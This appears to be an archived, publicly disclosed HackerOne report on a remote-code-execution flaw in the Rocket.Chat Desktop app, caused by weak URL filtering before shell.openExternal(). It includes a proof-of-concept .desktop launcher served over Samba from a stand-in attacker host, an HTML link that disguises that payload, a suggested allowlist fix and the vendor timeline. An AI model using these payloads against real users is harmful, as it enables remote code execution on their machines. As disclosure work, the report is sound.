---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2022-08-01
submitted: 2020-07-15T10:00:26.071Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "baltpeter"
source: "https://hackerone.com/reports/924151"
title: "Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE"
---
# Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 13 | **Program:** Rocket.Chat | **Disclosed:** 2022-08-01

- Report: [https://hackerone.com/reports/924151](https://hackerone.com/reports/924151)
- CWE: OS Command Injection
- Submitted: 2020-07-15T10:00:26.071Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.

**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.

## Releases Affected:

  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron

## Steps To Reproduce (from initial installation to vulnerability):

  1. Install Rocket.Chat Desktop on Xubuntu 20.04.
  2. Login and join a channel.
  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:
     
     ```ini
    [Desktop Entry]
    Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
    Type=Application
     ```
  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`
  5. Click the link and (if necessary) confirm starting the untrusted launcher.
  6. Notice the calculator and message box appearing, confirming remote code execution.

## Supporting Material/References:

  * I have attached a video of the attack to the report.

## Suggested mitigation

  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.

Best Regards,  
Benjamin Altpeter  
Technical University of Braunschweig, Germany

## Impact

* The attack can be triggered remotely by an attacker by simply sending a message to a channel.
  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.

## Timeline

- **Report Filed**
- **2020-07-15** @baltpeter: To add to this: The administrator of the server can set various messages like "Home Body" and "Login Terms", including the ability to place arbitrary links. By including the following in this message, they can obfuscate the URL of the payload:

```html
<a href="smb://attacker.tld/public/pwn.desktop">See our terms of service.</a>
```
- **Report Triaged**
- **2020-08-29** @baltpeter: Hi @markus-rocketchat,

any updates on this?

Best Regards,
Benjamin
- **2020-08-30** @markus-rocketchat: Hi @baltpeter 

sorry for the silence. Your report is on our task list. 

So we are planning some updates for the desktop app in the weeks to come, also adressing this. But we have to do some larger changes in general, this is why it is taking a bit longer than expected.

Thank you for your patience. I hope to share some news soon.

Best
Markus
- **2020-09-22** @markus-rocketchat: Hi @baltpeter 

just a quick follow-up: we have a solution upcoming, that requires users to accept opening "exotic" protocols like smb, rather than opening them right away
we are currently testing it and it should arrive soon

Best
Markus
- **2020-09-22** @baltpeter: Hi @markus-rocketchat,

that sounds good. Thanks for the update!

Best Regards,
Benjamin
- **2020-12-03** @markus-rocketchat: Hi @baltpeter 

another update from our side: we recently merged an attempt for a fix but got another report in with some additional mitigation advice. So before closing this one, me and the team would like to reconsider our existing solution in light of the recent feedback.

Will keep you posted.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
